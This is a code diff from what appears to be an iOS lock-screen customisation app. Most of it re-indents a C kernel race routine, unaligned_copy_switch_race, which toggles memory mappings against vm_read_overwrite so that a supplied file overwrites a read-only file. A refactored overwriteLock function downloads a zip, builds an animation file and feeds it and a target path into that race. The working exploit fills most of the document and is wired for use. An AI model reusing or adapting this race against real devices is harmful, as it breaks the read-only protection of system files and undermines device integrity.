@@ -60,7 +60,7 @@ switcheroo_thread(__unused void *arg)
 {
     kern_return_t kr;
     struct context1 *ctx;
-
+    
     ctx = (struct context1 *)arg;
     /* tell main thread we're ready to run */
     dispatch_semaphore_signal(ctx->running_sem);
@@ -69,31 +69,31 @@ switcheroo_thread(__unused void *arg)
         pthread_mutex_lock(&ctx->mtx);
         /* switch e0 to RW mapping */
         kr = vm_map(mach_task_self(),
-            &ctx->e0,
-            ctx->obj_size,
-            0,         /* mask */
-            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
-            ctx->mem_entry_rw,
-            0,
-            FALSE,         /* copy */
-            VM_PROT_READ | VM_PROT_WRITE,
-            VM_PROT_READ | VM_PROT_WRITE,
-            VM_INHERIT_DEFAULT);
+                    &ctx->e0,
+                    ctx->obj_size,
+                    0,         /* mask */
+                    VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+                    ctx->mem_entry_rw,
+                    0,
+                    FALSE,         /* copy */
+                    VM_PROT_READ | VM_PROT_WRITE,
+                    VM_PROT_READ | VM_PROT_WRITE,
+                    VM_INHERIT_DEFAULT);
         T_QUIET; T_EXPECT_MACH_SUCCESS(kr, " vm_map() RW");
         /* wait a little bit */
         usleep(100);
         /* switch bakc to original RO mapping */
         kr = vm_map(mach_task_self(),
-            &ctx->e0,
-            ctx->obj_size,
-            0,         /* mask */
-            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
-            ctx->mem_entry_ro,
-            0,
-            FALSE,         /* copy */
-            VM_PROT_READ,
-            VM_PROT_READ,
-            VM_INHERIT_DEFAULT);
+                    &ctx->e0,
+                    ctx->obj_size,
+                    0,         /* mask */
+                    VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+                    ctx->mem_entry_ro,
+                    0,
+                    FALSE,         /* copy */
+                    VM_PROT_READ,
+                    VM_PROT_READ,
+                    VM_INHERIT_DEFAULT);
         T_QUIET; T_EXPECT_MACH_SUCCESS(kr, " vm_map() RO");
         /* tell main thread we're don switching mappings */
         pthread_mutex_unlock(&ctx->mtx);
@@ -103,7 +103,7 @@ switcheroo_thread(__unused void *arg)
 }
 
 T_DECL(unaligned_copy_switch_race,
-    "Test that unaligned copy respects read-only mapping")
+       "Test that unaligned copy respects read-only mapping")
 {
     pthread_t th = NULL;
     int ret;
@@ -117,7 +117,7 @@ T_DECL(unaligned_copy_switch_race,
     int kern_success = 0, kern_protection_failure = 0, kern_other = 0;
     vm_address_t ro_addr, tmp_addr;
     memory_object_size_t mo_size;
-
+    
     ctx = &context1;
     ctx->obj_size = 256 * 1024;
     ctx->e0 = 0;
@@ -131,9 +131,9 @@ T_DECL(unaligned_copy_switch_race,
 #if 0
     /* allocate our attack target memory */
     kr = vm_allocate(mach_task_self(),
-        &ro_addr,
-        ctx->obj_size,
-        VM_FLAGS_ANYWHERE);
+                     &ro_addr,
+                     ctx->obj_size,
+                     VM_FLAGS_ANYWHERE);
     T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_allocate ro_addr");
     /* initialize to 'A' */
     memset((char *)ro_addr, 'A', ctx->obj_size);
@@ -142,67 +142,67 @@ T_DECL(unaligned_copy_switch_race,
     ro_addr = (uintptr_t)mmap(NULL, ctx->obj_size, PROT_READ, MAP_SHARED, fd, 0);
     /* make it read-only */
     kr = vm_protect(mach_task_self(),
-        ro_addr,
-        ctx->obj_size,
-        TRUE,             /* set_maximum */
-        VM_PROT_READ);
+                    ro_addr,
+                    ctx->obj_size,
+                    TRUE,             /* set_maximum */
+                    VM_PROT_READ);
     T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_protect ro_addr");
     /* make sure we can't get read-write handle on that target memory */
     mo_size = ctx->obj_size;
     kr = mach_make_memory_entry_64(mach_task_self(),
-        &mo_size,
-        ro_addr,
-        MAP_MEM_VM_SHARE | VM_PROT_READ | VM_PROT_WRITE,
-        &ctx->mem_entry_ro,
-        MACH_PORT_NULL);
+                                   &mo_size,
+                                   ro_addr,
+                                   MAP_MEM_VM_SHARE | VM_PROT_READ | VM_PROT_WRITE,
+                                   &ctx->mem_entry_ro,
+                                   MACH_PORT_NULL);
     T_QUIET; T_ASSERT_MACH_ERROR(kr, KERN_PROTECTION_FAILURE, "make_mem_entry() RO");
     /* take read-only handle on that target memory */
     mo_size = ctx->obj_size;
     kr = mach_make_memory_entry_64(mach_task_self(),
-        &mo_size,
-        ro_addr,
-        MAP_MEM_VM_SHARE | VM_PROT_READ,
-        &ctx->mem_entry_ro,
-        MACH_PORT_NULL);
+                                   &mo_size,
+                                   ro_addr,
+                                   MAP_MEM_VM_SHARE | VM_PROT_READ,
+                                   &ctx->mem_entry_ro,
+                                   MACH_PORT_NULL);
     T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "make_mem_entry() RO");
     T_QUIET; T_ASSERT_EQ(mo_size, (memory_object_size_t)ctx->obj_size, "wrong mem_entry size");
     /* make sure we can't map target memory as writable */
     tmp_addr = 0;
     kr = vm_map(mach_task_self(),
-        &tmp_addr,
-        ctx->obj_size,
-        0,         /* mask */
-        VM_FLAGS_ANYWHERE,
-        ctx->mem_entry_ro,
-        0,
-        FALSE,         /* copy */
-        VM_PROT_READ,
-        VM_PROT_READ | VM_PROT_WRITE,
-        VM_INHERIT_DEFAULT);
+                &tmp_addr,
+                ctx->obj_size,
+                0,         /* mask */
+                VM_FLAGS_ANYWHERE,
+                ctx->mem_entry_ro,
+                0,
+                FALSE,         /* copy */
+                VM_PROT_READ,
+                VM_PROT_READ | VM_PROT_WRITE,
+                VM_INHERIT_DEFAULT);
     T_QUIET; T_EXPECT_MACH_ERROR(kr, KERN_INVALID_RIGHT, " vm_map() mem_entry_rw");
     tmp_addr = 0;
     kr = vm_map(mach_task_self(),
-        &tmp_addr,
-        ctx->obj_size,
-        0,         /* mask */
-        VM_FLAGS_ANYWHERE,
-        ctx->mem_entry_ro,
-        0,
-        FALSE,         /* copy */
-        VM_PROT_READ | VM_PROT_WRITE,
-        VM_PROT_READ | VM_PROT_WRITE,
-        VM_INHERIT_DEFAULT);
+                &tmp_addr,
+                ctx->obj_size,
+                0,         /* mask */
+                VM_FLAGS_ANYWHERE,
+                ctx->mem_entry_ro,
+                0,
+                FALSE,         /* copy */
+                VM_PROT_READ | VM_PROT_WRITE,
+                VM_PROT_READ | VM_PROT_WRITE,
+                VM_INHERIT_DEFAULT);
     T_QUIET; T_EXPECT_MACH_ERROR(kr, KERN_INVALID_RIGHT, " vm_map() mem_entry_rw");
-
+    
     /* allocate a source buffer for the unaligned copy */
     kr = vm_allocate(mach_task_self(),
-        &e5,
-        ctx->obj_size,
-        VM_FLAGS_ANYWHERE);
+                     &e5,
+                     ctx->obj_size,
+                     VM_FLAGS_ANYWHERE);
     T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_allocate e5");
     /* initialize to 'C' */
     memset((char *)e5, 'C', ctx->obj_size);
-
+    
     FILE* overwrite_file = fopen(g_arg_overwrite_file_path, "r");
     fseek(overwrite_file, 0, SEEK_END);
     size_t overwrite_length = ftell(overwrite_file);
@@ -214,7 +214,7 @@ T_DECL(unaligned_copy_switch_race,
     char* e5_overwrite_ptr = (char*)(e5 + ctx->obj_size - overwrite_length);
     fread(e5_overwrite_ptr, 1, overwrite_length, overwrite_file);
     fclose(overwrite_file);
-
+    
     int overwrite_first_diff_offset = -1;
     char overwrite_first_diff_value = 0;
     for (int off = 0; off < overwrite_length; off++) {
@@ -227,7 +227,7 @@ T_DECL(unaligned_copy_switch_race,
         fprintf(stderr, "no diff?\n");
         exitApp();
     }
-
+    
     /*
      * get a handle on some writable memory that will be temporarily
      * switched with the read-only mapping of our target memory to try
@@ -235,116 +235,116 @@ T_DECL(unaligned_copy_switch_race,
      */
     tmp_addr = 0;
     kr = vm_allocate(mach_task_self(),
-        &tmp_addr,
-        ctx->obj_size,
-        VM_FLAGS_ANYWHERE);
+                     &tmp_addr,
+                     ctx->obj_size,
+                     VM_FLAGS_ANYWHERE);
     T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_allocate() some rw memory");
     /* initialize to 'D' */
     memset((char *)tmp_addr, 'D', ctx->obj_size);
     /* get a memory entry handle for that RW memory */
     mo_size = ctx->obj_size;
     kr = mach_make_memory_entry_64(mach_task_self(),
-        &mo_size,
-        tmp_addr,
-        MAP_MEM_VM_SHARE | VM_PROT_READ | VM_PROT_WRITE,
-        &ctx->mem_entry_rw,
-        MACH_PORT_NULL);
+                                   &mo_size,
+                                   tmp_addr,
+                                   MAP_MEM_VM_SHARE | VM_PROT_READ | VM_PROT_WRITE,
+                                   &ctx->mem_entry_rw,
+                                   MACH_PORT_NULL);
     T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "make_mem_entry() RW");
     T_QUIET; T_ASSERT_EQ(mo_size, (memory_object_size_t)ctx->obj_size, "wrong mem_entry size");
     kr = vm_deallocate(mach_task_self(), tmp_addr, ctx->obj_size);
     T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_deallocate() tmp_addr 0x%llx", (uint64_t)tmp_addr);
     tmp_addr = 0;
-
+    
     pthread_mutex_lock(&ctx->mtx);
-
+    
     /* start racing thread */
     ret = pthread_create(&th, NULL, switcheroo_thread, (void *)ctx);
     T_QUIET; T_ASSERT_POSIX_SUCCESS(ret, "pthread_create");
-
+    
     /* wait for racing thread to be ready to run */
     dispatch_semaphore_wait(ctx->running_sem, DISPATCH_TIME_FOREVER);
-
+    
     duration = 10; /* 10 seconds */
     T_LOG("Testing for %ld seconds...", duration);
     for (start = time(NULL), loops = 0;
-        time(NULL) < start + duration;
-        loops++) {
+         time(NULL) < start + duration;
+         loops++) {
         /* reserve space for our 2 contiguous allocations */
         e2 = 0;
         kr = vm_allocate(mach_task_self(),
-            &e2,
-            2 * ctx->obj_size,
-            VM_FLAGS_ANYWHERE);
+                         &e2,
+                         2 * ctx->obj_size,
+                         VM_FLAGS_ANYWHERE);
         T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_allocate to reserve e2+e0");
-
+        
         /* make 1st allocation in our reserved space */
         kr = vm_allocate(mach_task_self(),
-            &e2,
-            ctx->obj_size,
-            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_MAKE_TAG(240));
+                         &e2,
+                         ctx->obj_size,
+                         VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_MAKE_TAG(240));
         T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_allocate e2");
         /* initialize to 'B' */
         memset((char *)e2, 'B', ctx->obj_size);
-
+        
         /* map our read-only target memory right after */
         ctx->e0 = e2 + ctx->obj_size;
         kr = vm_map(mach_task_self(),
-            &ctx->e0,
-            ctx->obj_size,
-            0,         /* mask */
-            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_MAKE_TAG(241),
-            ctx->mem_entry_ro,
-            0,
-            FALSE,         /* copy */
-            VM_PROT_READ,
-            VM_PROT_READ,
-            VM_INHERIT_DEFAULT);
+                    &ctx->e0,
+                    ctx->obj_size,
+                    0,         /* mask */
+                    VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_MAKE_TAG(241),
+                    ctx->mem_entry_ro,
+                    0,
+                    FALSE,         /* copy */
+                    VM_PROT_READ,
+                    VM_PROT_READ,
+                    VM_INHERIT_DEFAULT);
         T_QUIET; T_EXPECT_MACH_SUCCESS(kr, " vm_map() mem_entry_ro");
-
+        
         /* let the racing thread go */
         pthread_mutex_unlock(&ctx->mtx);
         /* wait a little bit */
         usleep(100);
-
+        
         /* trigger copy_unaligned while racing with other thread */
         kr = vm_read_overwrite(mach_task_self(),
-            e5,
-            ctx->obj_size,
-            e2 + overwrite_length,
-            &copied_size);
+                               e5,
+                               ctx->obj_size,
+                               e2 + overwrite_length,
+                               &copied_size);
         T_QUIET;
         T_ASSERT_TRUE(kr == KERN_SUCCESS || kr == KERN_PROTECTION_FAILURE,
-            "vm_read_overwrite kr %d", kr);
+                      "vm_read_overwrite kr %d", kr);
         switch (kr) {
-        case KERN_SUCCESS:
-            /* the target was RW */
-            kern_success++;
-            break;
-        case KERN_PROTECTION_FAILURE:
-            /* the target was RO */
-            kern_protection_failure++;
-            break;
-        default:
-            /* should not happen */
-            kern_other++;
-            break;
+            case KERN_SUCCESS:
+                /* the target was RW */
+                kern_success++;
+                break;
+            case KERN_PROTECTION_FAILURE:
+                /* the target was RO */
+                kern_protection_failure++;
+                break;
+            default:
+                /* should not happen */
+                kern_other++;
+                break;
         }
         /* check that our read-only memory was not modified */
         T_QUIET; T_ASSERT_EQ(((char *)ro_addr)[overwrite_first_diff_offset], overwrite_first_diff_value, "RO mapping was modified");
-
+        
         /* tell racing thread to stop toggling mappings */
         pthread_mutex_lock(&ctx->mtx);
-
+        
         /* clean up before next loop */
         vm_deallocate(mach_task_self(), ctx->e0, ctx->obj_size);
         ctx->e0 = 0;
         vm_deallocate(mach_task_self(), e2, ctx->obj_size);
         e2 = 0;
     }
-
+    
     ctx->done = true;
     pthread_join(th, NULL);
-
+    
     kr = mach_port_deallocate(mach_task_self(), ctx->mem_entry_rw);
     T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "mach_port_deallocate(me_rw)");
     kr = mach_port_deallocate(mach_task_self(), ctx->mem_entry_ro);
@@ -353,10 +353,10 @@ T_DECL(unaligned_copy_switch_race,
     T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_deallocate(ro_addr)");
     kr = vm_deallocate(mach_task_self(), e5, ctx->obj_size);
     T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_deallocate(e5)");
-
-
+    
+    
     T_LOG("vm_read_overwrite: KERN_SUCCESS:%d KERN_PROTECTION_FAILURE:%d other:%d",
-        kern_success, kern_protection_failure, kern_other);
+          kern_success, kern_protection_failure, kern_other);
     T_PASS("Ran %d times in %ld seconds with no failure", loops, duration);
 }
 
@@ -562,110 +562,65 @@ static NSString *fileContents = @"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\
  </caml>\
  ";
 
-void overwriteLock(BOOL *media, NSString *url, NSString *path) {
+void overwriteLock(bool media, NSString *url, NSString *path) {
+    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
+    NSString *documentsDirectory = [paths objectAtIndex:0];
+    NSString *targetFilePath = [NSString stringWithFormat:@"%@/main.caml", documentsDirectory];
+    
     if (media == true) {
         dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
-            NSLog(@"downloading a fresh copy of custom zip file");
+            NSLog(@"Downloading custom .zip file");
             NSString *urlToDownload = url;
-            NSURL  *url = [NSURL URLWithString:urlToDownload];
+            NSURL *url = [NSURL URLWithString:urlToDownload];
             NSData *urlData = [NSData dataWithContentsOfURL:url];
-            if ( urlData )
+            if (urlData)
             {
-                NSArray       *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
-                NSString  *documentsDirectory = [paths objectAtIndex:0];
-                NSString  *filePath = [NSString stringWithFormat:@"%@/%@", documentsDirectory,@"TrollLock.zip"];
+                NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
+                NSString *documentsDirectory = [paths objectAtIndex:0];
+                NSString *filePath = [documentsDirectory stringByAppendingPathComponent:@"TrollLock.zip"];
+                NSLog(@"%@", filePath);
                 
                 dispatch_async(dispatch_get_main_queue(), ^{
                     [urlData writeToFile:filePath atomically:YES];
                     [SSZipArchive unzipFileAtPath:filePath toDestination:documentsDirectory];
-                    NSLog(@"yay! success");
+                    NSLog(@"Successfully downloaded custom .zip file");
                 });
             }
             
-        });
-        
-        for (int i = 1; i <= 40; i++) {
-            NSString *extension = @".png";
-            const char *extensionChar = extension.UTF8String;
-            NSString *trollFileName = [NSString stringWithFormat:@"trollformation%d%s",  i, extensionChar];
-            NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
-            NSString *documentsDirectory = [paths objectAtIndex:0];
-            NSString *trollPath = [documentsDirectory stringByAppendingPathComponent:trollFileName];
-            NSString *trollReplace = [NSString stringWithFormat:@"trolling%dx", i];
-            
-            fileContents = [fileContents stringByReplacingOccurrencesOfString:trollReplace withString:trollPath];
-        }
-        
-        NSLog(@"%@", fileContents); // Just in case? :D
-        
-        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
-            NSLog(@"downloading a fresh copy of main.caml");
-            NSString *urlToDownload = @"https://raw.githubusercontent.com/haxi0/TrollLock-Reborn/main/assets/main.caml";
-            NSURL  *url = [NSURL URLWithString:urlToDownload];
-            NSData *urlData = [NSData dataWithContentsOfURL:url];
-            if ( urlData )
-            {
-                NSArray       *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
-                NSString  *documentsDirectory = [paths objectAtIndex:0];
-                NSString  *filePath = [NSString stringWithFormat:@"%@/%@", documentsDirectory,@"main.caml"];
-                
-                dispatch_async(dispatch_get_main_queue(), ^{
-                    [urlData writeToFile:filePath atomically:YES];
-                    [fileContents writeToFile:filePath atomically:YES];
-                    NSLog(@"yay! success");
-                });
-            }
-            
-        });
-        
-        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
-            NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
-            NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
-            const char *model_path = dirName.UTF8String;
-            const char *target = path.UTF8String;
-            g_arg_target_file_path = target;
-            g_arg_overwrite_file_path = model_path;
-            unaligned_copy_switch_race();
-        });
-    } else {
-        for (int i = 1; i <= 40; i++) {
-                 NSString *trollFileName = [NSString stringWithFormat:@"trollformation%d", i];
-                 NSString *trollPath = [[NSBundle mainBundle] pathForResource:trollFileName ofType:@"png"];
-                 NSString *trollReplace = [NSString stringWithFormat:@"trolling%dx", i];
-
-                 fileContents = [fileContents stringByReplacingOccurrencesOfString:trollReplace withString:trollPath];
-             }
-        
-        NSLog(@"%@", fileContents); // Just in case? :D
-        
-        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
-            NSLog(@"downloading a fresh copy of main.caml");
-            NSString *urlToDownload = @"https://raw.githubusercontent.com/haxi0/TrollLock-Reborn/main/assets/main.caml";
-            NSURL  *url = [NSURL URLWithString:urlToDownload];
-            NSData *urlData = [NSData dataWithContentsOfURL:url];
-            if ( urlData )
-            {
-                NSArray       *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
-                NSString  *documentsDirectory = [paths objectAtIndex:0];
-                NSString  *filePath = [NSString stringWithFormat:@"%@/%@", documentsDirectory,@"main.caml"];
-
-                dispatch_async(dispatch_get_main_queue(), ^{
-                    [urlData writeToFile:filePath atomically:YES];
-                    [fileContents writeToFile:filePath atomically:YES];
-                    NSLog(@"yay! success");
-                });
-            }
-            
-        });
-        
-        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
-            NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
-            NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
-            const char *model_path = dirName.UTF8String;
-            const char *target = path.UTF8String;
-            g_arg_target_file_path = target;
-            g_arg_overwrite_file_path = model_path;
-            unaligned_copy_switch_race();
         });
     }
+    
+    for (int i = 1; i <= 40; i++) {
+        // Default troll face
+        NSString *trollFileName = [NSString stringWithFormat:@"trollformation%d", i];
+        NSString *trollFilePath = [[NSBundle mainBundle] pathForResource:trollFileName ofType:@"png"];
+        
+        if (media == true) {
+            // Custom lock icon
+            trollFileName = [NSString stringWithFormat:@"/trollformation%d.png", i];
+            trollFilePath = [documentsDirectory stringByAppendingString:trollFileName];
+        }
+        
+        NSString *trollReplace = [NSString stringWithFormat:@"trolling%dx", i];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:trollReplace withString:trollFilePath];
+    }
+    
+    // Log file contents for easy debugging.
+    NSLog(@"%@", fileContents);
+    
+    // Write animation file.
+    dispatch_async(dispatch_get_main_queue(), ^{
+        [fileContents writeToFile:targetFilePath atomically:YES];
+    });
+    
+    // Copy animation file to target folder.
+    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
+        NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+        NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+        const char *model_path = dirName.UTF8String;
+        const char *target = path.UTF8String;
+        g_arg_target_file_path = target;
+        g_arg_overwrite_file_path = model_path;
+        unaligned_copy_switch_race();
+    });
 }
